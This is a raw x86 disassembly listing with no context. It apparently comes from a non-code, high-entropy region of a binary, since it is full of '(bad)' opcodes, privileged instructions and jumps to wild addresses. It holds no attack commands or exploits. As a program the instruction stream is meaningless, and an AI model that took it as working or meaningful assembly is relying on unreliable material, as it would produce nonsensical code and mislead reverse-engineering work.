  42b7af:	aam    0xfd
  42b7b1:	loop   0x42b778
  42b7b3:	push   es
  42b7b4:	lock shl bh,1
  42b7b7:	sar    cl,0xe2
  42b7ba:	stc    
  42b7bb:	(bad)  
  42b7bd:	repnz stos DWORD PTR es:[edi],eax
  42b7bf:	enter  0xa8e8,0xd6
  42b7c3:	enter  0xd3e3,0xe8
  42b7c7:	iret   
  42b7c8:	retf   0xbeac
  42b7cb:	fdiv   st(6),st
  42b7cd:	int    0xf9
  42b7cf:	mov    edi,0x3fde7c3
  42b7d4:	inc    ah
  42b7d6:	ror    DWORD PTR [ecx],1
  42b7d8:	(bad)  
  42b7da:	leave  
  42b7db:	fcmove st,st(6)
  42b7dd:	call   0xe42c68c4
  42b7e2:	iret   
  42b7e3:	loope  0x42b7b3
  42b7e5:	aad    0xcc
  42b7e7:	int    0xcb
  42b7e9:	jmp    0xcfdc:0xd0ecc4d0
  42b7f0:	loop   0x42b7f9
  42b7f2:	out    0xec,al
  42b7f4:	(bad)  
  42b7f6:	fadd   DWORD PTR [ebx]
  42b7f8:	faddp  st(4),st
  42b7fa:	fnstsw ax
  42b7fc:	loope  0x42b7c8
  42b7fe:	(bad)  
  42b7ff:	mov    esp,0xcdbcc0c1
  42b804:	mov    cl,0xcc
  42b806:	into   
  42b807:	aad    0xd5
  42b809:	fst    st(3)
  42b80b:	sti    
  42b80c:	lock fucomip st,st(5)
  42b80f:	in     al,dx
  42b810:	sar    dh,1
  42b812:	hlt    
  42b813:	out    0xbd,al
  42b815:	(bad)  
  42b817:	add    al,bh
  42b819:	fcmovne st,st(7)
  42b81b:	leave  
  42b81c:	fmul   st,st(0)
  42b81e:	call   0xcbf974cb
  42b823:	xlat   BYTE PTR ds:[ebx]
  42b824:	mov    ah,0xee
  42b826:	icebp  
  42b827:	scas   al,BYTE PTR es:[edi]
  42b828:	mov    ecx,0xe8cab6e6
  42b82d:	out    dx,al
  42b82e:	loop   0x42b80c
  42b830:	int    0x7
  42b832:	add    ah,ah
  42b834:	fadd   QWORD PTR [edi]
  42b836:	cli    
  42b837:	fdivr  st,st(3)
  42b839:	hlt    
  42b83a:	stc    
  42b83b:	add    cl,BYTE PTR [ebx*8-0x3b225755]
  42b842:	jmp    0x42b814
  42b844:	lods   al,BYTE PTR ds:[esi]
  42b845:	into   
  42b846:	icebp  
  42b847:	rcr    cl,1
  42b849:	(bad)  
  42b84b:	out    dx,eax
  42b84c:	add    esi,esp
  42b84e:	enter  0xdbdd,0xde
  42b852:	aad    0x1
  42b854:	fld    QWORD PTR [esi]
  42b856:	jmp    0xe9489f24
  42b85b:	fninit 
  42b85d:	leave  
  42b85e:	retf   0xaddc
  42b861:	mov    bh,0xee
  42b863:	scas   al,BYTE PTR es:[edi]
  42b864:	mov    bl,0xf2
  42b866:	stc    
  42b867:	mov    dl,0xb5
  42b869:	(bad)  
  42b86a:	rcr    ch,cl
  42b86c:	test   bl,0xc1
  42b86f:	out    dx,al
  42b870:	out    dx,eax
  42b871:	loope  0x42b867
  42b873:	ror    BYTE PTR [edx],0xca
  42b876:	lock fisttp DWORD PTR [edi]
  42b879:	fucomp st(6)
  42b87b:	jmp    0xcd08cb8b
  42b880:	ret    0xc6e0
  42b883:	imul   bh
  42b885:	mov    ah,0xba
  42b887:	mov    al,0xb1
  42b889:	(bad)  
  42b88a:	aad    0xdb
  42b88c:	mov    ch,0xf4
  42b88e:	(bad)  
  42b88f:	int    0xec
  42b891:	push   edx
  42b893:	out    0xf6,al
  42b895:	xlat   BYTE PTR ds:[ebx]
  42b896:	push   es
  42b897:	(bad)  
  42b898:	out    0xcb,al
  42b89a:	fucomip st,st(7)
  42b89c:	stc    
  42b89d:	shl    bl,cl
  42b89f:	rcl    ecx,cl
  42b8a1:	imul   DWORD PTR [esp+edx*8-0xf160f35]
  42b8a8:	cli    
  42b8a9:	dec    edi
  42b8ab:	shl    esp,cl
  42b8ad:	enter  0x1da,0xef
  42b8b1:	mov    esi,0xfefef9d3
  42b8b6:	fcmovne st,st(1)
  42b8b8:	out    0x4,eax
  42b8ba:	(bad)
  42b8be:	scas   al,BYTE PTR es:[edi]
  42b8bf:	ror    al,1
  42b8c1:	(bad)  
  42b8c2:	jecxz  0x42b889
  42b8c4:	repz cmc 
  42b8c6:	repnz mov edx,0xb2ddeabf
  42b8cc:	retf   
  42b8cd:	fsincos 
  42b8cf:	int    0xbd
  42b8d1:	mov    ebp,0xe7fdd0f5
  42b8d6:	fld    QWORD PTR [ecx]
  42b8d8:	rcl    dh,0xe9
  42b8db:	adc    ecx,DWORD PTR [eax]
  42b8dd:	out    dx,al
  42b8de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b8df:	mov    edi,0xefcdd0c4
  42b8e4:	call   0xd0f9939a
  42b8e9:	idiv   ch
  42b8eb:	add    edi,DWORD PTR [ebx-0x1d2d0309]
  42b8f1:	add    al,BYTE PTR [ebx]
  42b8f3:	ret    
  42b8f4:	(bad)  
  42b8f5:	retf   0xc4d1
  42b8f8:	loope  0x42b8fe
  42b8fa:	(bad)  
  42b8fb:	fdivp  st(3),st
  42b8fd:	push   es
  42b8fe:	test   eax,0xd5e1c7d3
  42b903:	rol    ch,1
  42b905:	(bad)  
  42b906:	lock (bad) 
  42b908:	fmul   st,st(6)
  42b90a:	enter  0xbbff,0xd5
  42b90e:	call   0xfb469415
  42b913:	sar    ebp,0xc6
  42b916:	jmp    0xeb2fc0e2
  42b91b:	fisttp QWORD PTR [ecx]
  42b91d:	shr    BYTE PTR [ebp-0x32112232],cl
  42b923:	(bad)  
  42b924:	(bad)  
  42b925:	jmp    0xedeb:0xb6c5fbed
  42b92c:	stc    
  42b92d:	int3   
  42b92e:	sti    
  42b92f:	loope  0x42b927
  42b931:	bnd ret 
  42b933:	out    0xb9,al
  42b935:	out    0x8,eax
  42b937:	in     al,0x8
  42b939:	fmul   st(5),st
  42b93b:	add    cl,dl
  42b93d:	or     ebx,edx
  42b93f:	stos   BYTE PTR es:[edi],al
  42b940:	lods   eax,DWORD PTR ds:[esi]
  42b941:	in     eax,0xdd
  42b943:	test   ebp,0xb9c6fbce
  42b949:	(bad)  
  42b94a:	retf   0xd6ea
  42b94d:	imul   dh
  42b94f:	out    dx,al
  42b950:	mov    ebp,0xf8fdd3c7
  42b955:	add    esi,eax
  42b957:	(bad)  
  42b958:	(bad)  
  42b959:	out    0x7,al
  42b95b:	iret   
  42b95c:	call   0xef329845
  42b961:	loop   0x42b958
  42b963:	mov    al,0xed
  42b965:	mov    ah,0xd9
  42b967:	aam    0xb4
  42b969:	mov    ebx,0xcadad4d4
  42b96e:	cld    
  42b96f:	call   0xc601a974
  42b974:	add    esi,ecx
  42b976:	add    esp,ebp
  42b978:	paddusb mm1,mm1
  42b97b:	(bad)  
  42b97d:	push   es
  42b97e:	jecxz  0x42b96a
  42b980:	ret    
  42b981:	icebp  
  42b982:	fsubr  st(5),st
  42b984:	jmp    0x42b970
  42b986:	in     eax,dx
  42b987:	jmp    0xebfa975b
  42b98c:	mov    edi,0xd3f7cdd6
  42b991:	pop    es
  42b992:	idiv   ah
  42b994:	push   es
  42b995:	aam    0xe7
  42b997:	ret    0xe704
  42b99a:	or     ecx,eax
  42b99c:	stc    
  42b99d:	loop   0x42b97c
  42b99f:	scas   eax,DWORD PTR es:[edi]
  42b9a0:	repnz out dx,eax
  42b9a2:	retf   0xf5b4
  42b9a5:	rol    dh,0xcd
  42b9a8:	leave  
  42b9a9:	call   0x31fb58b
  42b9ae:	int3   
  42b9af:	in     al,dx
  42b9b0:	shl    al,1
  42b9b2:	(bad)  
  42b9b4:	aam    0xc7
  42b9b6:	jmp    0x42b9b2
  42b9b8:	mov    BYTE PTR [esi+edi*8],0xc
  42b9bc:	out    0xec,eax
  42b9be:	lods   al,BYTE PTR ds:[esi]
  42b9bf:	out    dx,al
  42b9c0:	lods   al,BYTE PTR ds:[esi]
  42b9c1:	(bad)  
  42b9c2:	enter  0xd7ef,0xc4
  42b9c6:	shl    BYTE PTR [ebp-0x2e062611],cl
  42b9cc:	mov    eax,0xd4dad3d4
  42b9d1:	int3   
  42b9d2:	(bad)
  42b9d5:	ret    0xc9c3
  42b9d8:	pextrw ebx,mm7,0xd9
  42b9dc:	push   es
  42b9dd:	in     eax,0xee
  42b9df:	(bad)  
  42b9e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9e2:	mov    dh,0xec
  42b9e4:	test   eax,0xb6f5d8e1
  42b9e9:	(bad)
  42b9ec:	loop   0x42b9c1
  42b9ee:	(bad)  
  42b9f0:	clc    
  42b9f1:	push   es
  42b9f2:	fsub   st(4),st
  42b9f4:	shl    eax,1
  42b9f6:	aam    0xc9
  42b9f8:	pop    es
  42b9f9:	in     eax,0xfe
  42b9fb:	adc    eax,ecx
  42b9fd:	adc    esp,eax
  42b9ff:	(bad)  
  42ba00:	scas   al,BYTE PTR es:[edi]
  42ba01:	jmp    0x42b9c8
  42ba03:	(bad)  
  42ba04:	mov    bl,0xc0
  42ba06:	mov    edx,0xf5c5faf8
  42ba0b:	mov    ebx,0xdff0bbed
  42ba10:	fcmovnbe st,st(1)
  42ba12:	aam    0xec
  42ba14:	fild   WORD PTR [ecx]
  42ba16:	(bad)  
  42ba18:	sti    
  42ba19:	or     al,ch
  42ba1b:	ret    0xe1cf
  42ba1e:	les    esi,FWORD PTR [edx-0x322d2c24]
  42ba24:	cmc    
  42ba25:	xlat   BYTE PTR ds:[ebx]
  42ba26:	mov    edx,0xb5ddd2e0
  42ba2b:	jmp    0xf1387526
  42ba30:	mov    esp,0xd0bcc1f1
  42ba35:	xbegin 0xf920bd3c
  42ba3b:	out    0xc1,al
  42ba3d:	fld    st(1)
  42ba3f:	int3   
  42ba40:	(bad)  
  42ba41:	enter  0xe7af,0xb4
  42ba45:	shl    ch,0xf0
  42ba48:	repnz into 
  42ba4a:	leave  
  42ba4b:	hlt    
  42ba4c:	ffree  st(3)
  42ba4e:	loop   0x42ba2b
  42ba50:	aam    0xc2
  42ba52:	loope  0x42ba4c
  42ba54:	(bad)  
  42ba56:	loope  0x42ba67
  42ba58:	leave  
  42ba59:	fdiv   st(5),st
  42ba5b:	add    cl,ch
  42ba5d:	loope  0x42ba31
  42ba5f:	jmp    0xb0b1:0xe7e2e8c9
  42ba66:	in     eax,dx
  42ba67:	mov    eax,0xf0d4cfb0
  42ba6c:	(bad)  
  42ba6d:	fcmovu st,st(1)
  42ba6f:	jecxz  0x42ba66
  42ba71:	stc    
  42ba72:	(bad)  
  42ba74:	add    eax,esp
  42ba76:	or     esp,ebx
  42ba78:	(bad)  
  42ba79:	(bad)  
  42ba7a:	in     eax,0xe1
  42ba7c:	add    edi,esp
  42ba7e:	(bad)  
  42ba80:	in     al,dx
  42ba81:	mov    dl,0xcd
  42ba83:	in     al,0xcd
  42ba85:	(bad)  
  42ba86:	repz sti 
  42ba88:	mov    ebx,0xbfeceaca
  42ba8d:	jecxz  0x42ba68
  42ba8f:	mov    dh,0xf2
  42ba91:	out    0x0,al
  42ba93:	repnz loopne 0x42ba66
  42ba96:	in     eax,0x1
  42ba98:	or     edi,ebp
  42ba9a:	retf   0xdcf9
  42ba9d:	out    0xcd,eax
  42ba9f:	fmul   st(0),st
  42baa1:	out    0xad,eax
  42baa3:	out    dx,al
  42baa4:	repz out 0xb9,al
  42baa7:	mov    al,0xcd
  42baa9:	mov    esi,0xfdccc8bb
  42baae:	sti    
  42baaf:	fiadd  WORD PTR [eax]
  42bab1:	add    DWORD PTR [ebp+0xbf5f2c3],edi
  42bab7:	idiv   eax
  42bab9:	iret   
  42baba:	pop    es
  42babb:	or     eax,DWORD PTR ds:0xe0ceecc4
  42bac1:	shl    bh,cl
  42bac3:	(bad)  
  42bac4:	retf   0xdbba
  42bac7:	shl    bh,1
  42bac9:	rcl    edx,1
  42bacb:	test   dh,0xea
  42bace:	fst    st(2)
  42bad0:	fst    st(2)
  42bad2:	int    0x3
  42bad4:	loopne 0x42bad3
  42bad6:	clc    
  42bad7:	in     al,0xe1
  42bad9:	jmp    0xe6c6:0xdce6c4ec
  42bae0:	(bad)  [eax-0x132b4a4b]
  42bae6:	cmc    
  42bae7:	sar    BYTE PTR [ebx-0x71b2133],1
  42baed:	mov    eax,0xd8ecffb9
  42baf2:	ret    0x5ff
  42baf5:	mov    DWORD PTR [esi],0xe5df0009
  42bafb:	or     eax,0xe2f30be0
  42bb00:	enter  0xe4ee,0xe5
  42bb04:	ret    
  42bb05:	out    0xca,al
  42bb07:	cmc    
  42bb08:	div    DWORD PTR [esi-0x2b07462a]
  42bb0e:	std    
  42bb0f:	out    dx,al
  42bb10:	cmc    
  42bb11:	(bad)  
  42bb12:	loopne 0x42bb16
  42bb14:	push   es
  42bb15:	(bad)  [eax]
  42bb17:	add    al,0xdb
  42bb19:	add    eax,0xe704d8e2
  42bb1e:	test   eax,0xcbc4a5a8
  42bb23:	loopne 0x42baff
  42bb25:	loop   0x42baee
  42bb27:	(bad)
  42bb2a:	mov    edi,0xbaeefbdb
  42bb2f:	add    bh,al
  42bb31:	(bad)  
  42bb32:	repz aad 0xc3
  42bb35:	fadd   st,st(4)
  42bb37:	(bad)  
  42bb39:	add    edi,eax
  42bb3b:	hlt    
  42bb3c:	retf   0xb300
  42bb3f:	shl    edx,1
  42bb41:	cmc    
  42bb42:	loope  0x42bb32
  42bb44:	ret    0xf5b7
  42bb47:	out    dx,al
  42bb48:	(bad)  
  42bb49:	fcmove st,st(0)
  42bb4b:	mov    edi,0xdce9f5e8
  42bb50:	push   es
  42bb51:	out    0xfb,eax
  42bb53:	pop    es
  42bb54:	(bad)  
  42bb55:	or     edx,esi
  42bb57:	add    DWORD PTR [esi],ecx
  42bb59:	(bad)  
  42bb5b:	inc    BYTE PTR [ecx]
  42bb5d:	int3   
  42bb5e:	into   
  42bb5f:	int3   
  42bb60:	(bad)  
  42bb61:	ret    
  42bb62:	xlat   BYTE PTR ds:[ebx]
  42bb63:	xlat   BYTE PTR ds:[ebx]
  42bb64:	(bad)  
  42bb65:	jmp    0xcd338464
  42bb6a:	mov    ebp,0xb9ced2c8
  42bb6f:	(bad)  
  42bb70:	mov    eax,0x6c6d5f1
  42bb75:	sti    
  42bb76:	(bad)  
  42bb77:	or     dh,bh
  42bb79:	in     eax,dx
  42bb7a:	fimul  DWORD PTR [ecx]
  42bb7c:	out    0xfc,al
  42bb7e:	mov    edi,0xadb1dea6
  42bb83:	mov    bh,0xee
  42bb85:	jmp    0xdbd0:0xcbd7cce5
  42bb8c:	in     eax,dx
  42bb8d:	xlat   BYTE PTR ds:[ebx]
  42bb8e:	mov    ebp,0xdef9d5d5
  42bb93:	xbegin 0xf6137e95
  42bb99:	iret   
  42bb9a:	inc    BYTE PTR [ebx]
  42bb9c:	fld1   
  42bb9e:	out    dx,al
  42bb9f:	out    dx,eax
  42bba0:	jmp    0x42bb88
  42bba2:	shl    dh,0xc6
  42bba5:	mov    edx,0xccd9b1ea
  42bbaa:	icebp  
  42bbab:	mov    dl,0xd7
  42bbad:	retf   0xfffb
  42bbb0:	cli    
  42bbb1:	xlat   BYTE PTR ds:[ebx]
  42bbb2:	fistp  QWORD PTR [esi-0x3e3a2af9]
  42bbb8:	fneni(8087 only) 
  42bbba:	retf   0xf8fe
  42bbbd:	leave  
  42bbbe:	in     eax,0xc3
  42bbc0:	repz shr ch,0xc1
  42bbc4:	repnz out dx,eax
  42bbc6:	stc    
  42bbc7:	shl    DWORD PTR [ecx-0x451c4705],1
  42bbcd:	cld    
  42bbce:	mov    ebx,0xfdd8ddf3
  42bbd3:	fiadd  WORD PTR [ebx+ecx*1]
  42bbd6:	clc    
  42bbd7:	(bad)  
  42bbd8:	cli    
  42bbd9:	pop    es
  42bbda:	add    dl,ch
  42bbdc:	add    eax,0xc8b8eaca
  42bbe1:	shl    DWORD PTR [edx-0x4c092849],cl
  42bbe7:	mov    ebx,0xbbcbc8d0
  42bbec:	icebp  
  42bbed:	(bad)  
  42bbef:	div    dh
  42bbf1:	(bad)  
  42bbf2:	cli    
  42bbf3:	rol    esp,1
  42bbf5:	fnstsw WORD PTR [edi-0x3050810]
  42bbfb:	into   
  42bbfc:	fnclex 
  42bbfe:	scas   eax,DWORD PTR es:[edi]
  42bbff:	fbstp  TBYTE PTR [eax-0x3d4f0b2d]
  42bc05:	lock shl bl,cl
  42bc08:	leave  
  42bc09:	mov    al,0xb9
  42bc0b:	repz mov cl,0xf8
  42bc0e:	mov    bh,0xc1
  42bc10:	icebp  
  42bc11:	mov    eax,0xc5ddc1d2
  42bc16:	add    eax,DWORD PTR [edx]
  42bc18:	(bad)  
  42bc19:	out    dx,eax
  42bc1a:	out    dx,al
  42bc1b:	fsub   st,st(7)
  42bc1d:	add    bl,al
  42bc1f:	(bad)  
  42bc20:	(bad)
  42bc23:	stos   BYTE PTR es:[edi],al
  42bc24:	retf   
  42bc25:	jmp    0xf7f986eb
  42bc2a:	clc    
  42bc2b:	push   ecx
  42bc2d:	xlat   BYTE PTR ds:[ebx]
  42bc2e:	shl    edi,1
  42bc30:	stc    
  42bc31:	div    ah
  42bc33:	xlat   BYTE PTR ds:[ebx]
  42bc34:	in     eax,0x7
  42bc36:	std    
  42bc37:	call   0xc947aa2b
  42bc3c:	stc    
  42bc3d:	or     eax,0xedc3edd1
  42bc42:	loopne 0x42bbf7
  42bc44:	int    0xe7
  42bc46:	out    dx,eax
  42bc47:	mov    eax,0xddfeccc9
  42bc4c:	(bad)  
  42bc4e:	aam    0xf8
  42bc50:	fdiv   st,st(1)
  42bc52:	rol    dl,1
  42bc54:	fucomip st,st(1)
  42bc56:	aad    0xf5
  42bc58:	or     ebp,ebx
  42bc5a:	pop    es
  42bc5b:	std    
  42bc5c:	leave  
  42bc5d:	or     esi,eax
  42bc5f:	call   0xb3037f56
  42bc64:	int3   
  42bc65:	fcmove st,st(0)
  42bc67:	rcr    bh,cl
  42bc69:	(bad)  
  42bc6a:	call   0xf1fbb349
  42bc6f:	add    DWORD PTR [edi],eax
  42bc71:	loop   0x42bc58
  42bc73:	in     al,dx
  42bc74:	jecxz  0x42bc3b
  42bc76:	jecxz  0x42bc7f
  42bc78:	add    al,0xb
  42bc7a:	retf   0xed01
  42bc7d:	call   0xd60a6f2f
  42bc82:	lods   al,BYTE PTR ds:[esi]
  42bc83:	jmp    0x42bc5b
  42bc85:	out    0xc8,al
  42bc87:	out    0xf8,al
  42bc89:	cli    
  42bc8a:	cli    
  42bc8b:	(bad)  
  42bc8d:	mov    ebx,0xfdf7c3d0
  42bc92:	sti    
  42bc93:	int3   
  42bc94:	rol    ebx,cl
  42bc96:	retf   
  42bc97:	rcr    eax,0xe
  42bc9a:	(bad)  
  42bc9c:	fucomi st,st(1)
  42bc9e:	mov    edi,0xddc5acea
  42bca3:	icebp  
  42bca4:	repnz fnop 
  42bca7:	(bad)  
  42bca8:	in     al,dx
  42bca9:	(bad)  
  42bcaa:	call   0xd91b9a92
  42bcaf:	fstp   TBYTE PTR [edi-0x19f90443]
  42bcb5:	cmc    
  42bcb6:	or     edx,ebp
  42bcb8:	in     eax,0xe9
  42bcba:	jmp    0x42bcbb
  42bcbc:	fmulp  st(2),st
  42bcbe:	jmp    0x42bc78
  42bcc0:	ror    ebp,0xe0
  42bcc3:	mov    esp,0xc7fbacd0
  42bcc8:	jmp    0xbce2:0xfed5cdcc
  42bccf:	rol    DWORD PTR [ecx],1
  42bcd1:	(bad)  
  42bcd2:	mul    cl
  42bcd4:	mov    ecx,0xcbd9f8e6
  42bcd9:	add    ch,dl
  42bcdb:	hlt    
  42bcdc:	loopne 0x42bcc5
  42bcde:	out    0xe3,al
  42bce0:	out    dx,al
  42bce1:	(bad)  
  42bce2:	out    dx,al
  42bce3:	mov    ah,0xe7
  42bce5:	ror    bl,1
  42bce7:	mov    ah,0xca
  42bce9:	lock hlt 
  42bceb:	in     al,0xd1
  42bced:	std    
  42bcee:	mul    edx
  42bcf0:	out    dx,eax
  42bcf1:	cld    
  42bcf2:	aam    0xdd
  42bcf4:	fsubrp st(6),st
  42bcf6:	or     BYTE PTR [edi+ebp*8],al
  42bcf9:	add    al,0xc7
  42bcfb:	add    eax,0xebe204df
  42bd00:	ret    
  42bd01:	lock iret 
  42bd03:	in     eax,dx
  42bd04:	lods   al,BYTE PTR ds:[esi]
  42bd05:	out    dx,al
  42bd06:	div    BYTE PTR [ebp+0x3e5c6b7]
  42bd0c:	hlt    
  42bd0d:	loope  0x42bd03
  42bd0f:	mov    ecx,0xc6f5eeee
  42bd14:	xlat   BYTE PTR ds:[ebx]
  42bd15:	ret    
  42bd16:	shr    eax,0xe9
  42bd19:	loopne 0x42bd2a
  42bd1b:	iret   
  42bd1c:	iret   
  42bd1d:	fdiv   QWORD PTR [edx-0x3b5b5638]
  42bd23:	in     eax,0xd0
  42bd25:	ret    0xd3e1
  42bd28:	hlt    
  42bd29:	jmp    0xbc268cff
  42bd2e:	idiv   ecx
  42bd30:	(bad)  
  42bd32:	icebp  
  42bd33:	aad    0xe6
  42bd35:	rcr    al,1
  42bd37:	idiv   edi
  42bd39:	cli    
  42bd3a:	jecxz  0x42bd22
  42bd3c:	out    dx,eax
  42bd3d:	call   0xb01a99ee
  42bd42:	(bad)  
  42bd43:	mov    al,0xcd
  42bd45:	div    DWORD PTR [ebx-0x4a3b0d12]
  42bd4b:	bnd jmp 0x815ad4b
  42bd51:	fdecstp 
  42bd53:	fsqrt  
  42bd55:	or     DWORD PTR [edi+0x7d6e9d0],edi
  42bd5b:	pop    es
  42bd5c:	or     ecx,DWORD PTR ds:0xccc7ddb1
  42bd62:	ret    0xcbe5
  42bd65:	call   0xdff49959
  42bd6a:	mov    edi,0xe9eff4bf
  42bd6f:	fdivr  DWORD PTR [ebp+esi*8-0xe343a39]
  42bd76:	add    al,0xcb
  42bd78:	in     al,0x7
  42bd7a:	std    
  42bd7b:	or     bh,cl
  42bd7d:	repz mov esp,0xb7d5e3be
  42bd83:	hlt    
  42bd84:	shl    esp,0xf4
  42bd87:	out    0xed,al
  42bd89:	xlat   BYTE PTR ds:[ebx]
  42bd8a:	mov    bh,0xbb
  42bd8c:	hlt    
  42bd8d:	fidivr WORD PTR [edx-0x44192e11]
  42bd93:	loop   0x42bd6f
  42bd95:	dec    BYTE PTR [eax]
  42bd97:	wbinvd 
  42bd99:	fcmovb st,st(5)
  42bd9b:	out    0xfa,eax
  42bd9d:	or     BYTE PTR [edi-0x2d4d5018],bh
  42bda3:	shr    dh,0xf7
  42bda6:	mov    bh,0xb5
  42bda8:	mov    cl,0xd8
  42bdaa:	call   0xef3ebb88
  42bdaf:	xlat   BYTE PTR ds:[ebx]
  42bdb0:	fcmovnu st,st(7)
  42bdb2:	sar    BYTE PTR [ebp+edi*4-0x400fa0f],0xca
  42bdba:	(bad)  
  42bdbd:	cld    
  42bdbe:	loopne 0x42bd8b
  42bdc0:	(bad)  
  42bdc1:	aad    0xf4
  42bdc3:	lock repnz out dx,al
  42bdc6:	lock hlt 
  42bdc8:	in     eax,dx
  42bdc9:	fmulp  st(4),st
  42bdcb:	fmulp  st(3),st
  42bdcd:	add    edx,ebx
  42bdcf:	ret    0xc1ec
  42bdd2:	int3   
  42bdd3:	rcr    eax,1
  42bdd5:	inc    edi
  42bdd7:	aad    0xf4
  42bdd9:	ffree  st(4)
  42bddb:	add    eax,0xebbcc806
  42bde0:	int    0xce
  42bde2:	shl    cl,cl
  42bde4:	shr    ah,0xcb
  42bde7:	lock xlat BYTE PTR ds:[ebx]
  42bde9:	out    dx,al
  42bdea:	(bad)  
  42bdeb:	jmp    0x42bdc4
  42bded:	add    eax,DWORD PTR [eax]
  42bdef:	(bad)  
  42bdf0:	loope  0x42bde0
  42bdf2:	cli    
  42bdf3:	(bad)  
  42bdf4:	shl    ah,1
  42bdf6:	or     bh,ch
  42bdf8:	pop    es
  42bdf9:	lds    eax,FWORD PTR [eax]
  42bdfb:	out    dx,eax
  42bdfc:	enter  0xcaea,0xde
  42be00:	not    bh
  42be02:	out    0xca,eax
  42be04:	int3   
  42be05:	div    BYTE PTR [edi+edi*8-0x2072236]
  42be0c:	in     eax,dx
  42be0d:	in     al,dx
  42be0e:	mov    ebp,0xf3c002c2
  42be13:	sti    
  42be14:	add    eax,0xe8d0d0db
  42be19:	sti    
  42be1a:	or     esp,esi
  42be1c:	sti    
  42be1d:	jecxz  0x42be0e
  42be1f:	rol    al,1
  42be21:	loop   0x42bdea
  42be23:	loope  0x42bdd1
  42be25:	out    0xdb,eax
  42be27:	in     eax,0xce
  42be29:	clc    
  42be2a:	mov    esi,0xedd7f0db
  42be2f:	fdecstp 
  42be31:	add    eax,0xffd6ddcd
  42be36:	rol    esp,1
  42be38:	pop    es
  42be39:	loopne 0x42be30
  42be3b:	cli    
  42be3c:	add    al,0xe4
  42be3e:	(bad)  
  42be3f:	shr    al,1
  42be41:	shr    al,cl
  42be43:	icebp  
  42be44:	int    0xb3
  42be46:	in     eax,0xec
  42be48:	shl    BYTE PTR [esi-0xf280d41],cl
  42be4e:	call   0xee1da131
  42be53:	out    0xf5,al
  42be55:	repnz fcmovu st,st(4)
  42be58:	fsincos 
  42be5a:	clc    
  42be5b:	(bad)  ds:0xddefe201
  42be61:	out    dx,eax
  42be62:	aad    0xf2
  42be64:	icebp  
  42be65:	rcl    bl,0xd7
  42be68:	xlat   BYTE PTR ds:[ebx]
  42be69:	shr    ecx,1
  42be6b:	shl    bl,1
  42be6d:	in     al,dx
  42be6e:	(bad)  
  42be6f:	add    ecx,edi
  42be71:	aam    0xe1
  42be73:	fcomp  st(5)
  42be75:	out    0xb,eax
  42be77:	(bad)  
  42be78:	iret   
  42be79:	fimul  WORD PTR [esi]
  42be7b:	(bad)  
  42be7d:	or     al,0xe3
  42be7f:	in     eax,0xef
  42be81:	repnz rcl esp,1
  42be84:	mov    al,0xf3
  42be86:	test   eax,0xb8d2edff
  42be8c:	loop   0x42be64
  42be8e:	(bad)  
  42be90:	cmc    
  42be91:	in     eax,dx
  42be92:	mov    esi,0x5d6e603
  42be97:	add    DWORD PTR [ebp+0x12fdeddd],edi
  42be9d:	out    dx,al
  42be9e:	test   al,0xe8
  42bea0:	mov    esp,0xa9b0e0be
  42bea5:	loope  0x42be79
  42bea7:	retf   
  42bea8:	fdivp  st(6),st
  42beaa:	(bad)  
  42beac:	std    
  42bead:	mov    al,0x2
  42beaf:	mov    edi,0xebd4d0ce
  42beb4:	xlat   BYTE PTR ds:[ebx]
  42beb5:	add    dl,bh
  42beb7:	push   ebp
  42beb9:	in     eax,0xce
  42bebb:	out    0xa,al
  42bebd:	sar    BYTE PTR [ecx-0x163a2c52],cl
  42bec3:	shr    DWORD PTR [ebp+eiz*8-0x44050c0a],cl
  42beca:	(bad)  
  42becd:	mov    eax,0xc6d5d7f2
  42bed2:	shr    bl,cl
  42bed4:	(bad)  
  42bed6:	in     eax,0xf5
  42bed8:	push   es
  42bed9:	vpmaxsw xmm1,xmm6,xmm6
  42bedd:	repnz out dx,al
  42bedf:	shl    ecx,1
  42bee1:	into   
  42bee2:	not    esi
  42bee4:	out    0xc7,al
  42bee6:	int    0xc0
  42bee8:	shl    ebp,1
  42beea:	fucomi st,st(0)
  42beec:	in     al,dx
  42beed:	shl    cl,cl
  42beef:	repnz push es
  42bef1:	add    ecx,esp
  42bef3:	int3   
  42bef4:	shl    edx,1
  42bef6:	mul    eax
  42bef8:	in     al,0xde
  42befa:	in     eax,0xe2
  42befc:	jmp    esp
  42befe:	in     al,dx
  42beff:	(bad)  [edx+eiz*8-0xe2f3a3a]
  42bf06:	jmp    0x42bed0
  42bf08:	vpsadbw ymm6,ymm7,ymm4
  42bf0c:	retf   0xceda
  42bf0f:	out    0xed,eax
  42bf11:	int3   
  42bf12:	lock rcr dl,0xc1
  42bf16:	out    0xdc,eax
  42bf18:	retf   0xdc0
  42bf1b:	loop   0x42bef6
  42bf1d:	loope  0x42befb
  42bf1f:	out    0xb3,al
  42bf21:	mov    ebp,0xcaccb2c6
  42bf26:	(bad)  
  42bf27:	loopne 0x42bee4
  42bf29:	mov    ah,0xcd
  42bf2c:	mov    ch,0xea
  42bf2e:	mov    ecx,0x3d7f7cc
  42bf33:	sar    eax,1
  42bf35:	in     al,0xfc
  42bf37:	clc    
  42bf38:	jmp    0xeef3:0x12f9edf9
  42bf3f:	repz scas eax,DWORD PTR es:[edi]
  42bf41:	iret   
  42bf42:	mov    esp,0xc6e2dbe1
  42bf47:	jmp    0xca089d15
  42bf4c:	mov    ebx,0xcdf8fcc9
  42bf51:	mov    ah,0xe5
  42bf53:	loopne 0x42bf58
  42bf55:	ror    BYTE PTR [ebx],cl
  42bf57:	out    dx,eax
  42bf58:	fild   WORD PTR [ecx]
  42bf5a:	push   cs
  42bf5b:	pop    es
  42bf5c:	in     al,0xa
  42bf5e:	stos   BYTE PTR es:[edi],al
  42bf5f:	stos   BYTE PTR es:[edi],al
  42bf60:	mov    bl,0xee
  42bf62:	shr    dl,1
  42bf64:	mul    edi
  42bf66:	out    dx,al
  42bf67:	ror    edi,cl
  42bf69:	(bad)  
  42bf6b:	jecxz  0x42bf5c
  42bf6d:	in     eax,dx
  42bf6e:	add    edi,DWORD PTR [ecx-0x41192a26]
  42bf74:	jecxz  0x42bf6f
  42bf76:	jmp    0xcae0:0xe2c6c1ea
  42bf7d:	inc    eax
  42bf7f:	xlat   BYTE PTR ds:[ebx]
  42bf80:	ffree  st(4)
  42bf82:	mov    bl,0xb7
  42bf84:	mov    ah,0xc6
  42bf86:	cmc    
  42bf87:	mov    bh,0xb9
  42bf8a:	ror    edx,cl
  42bf8c:	mov    ebx,0xdbb6fbbd
  42bf91:	out    dx,al
  42bf92:	icebp  
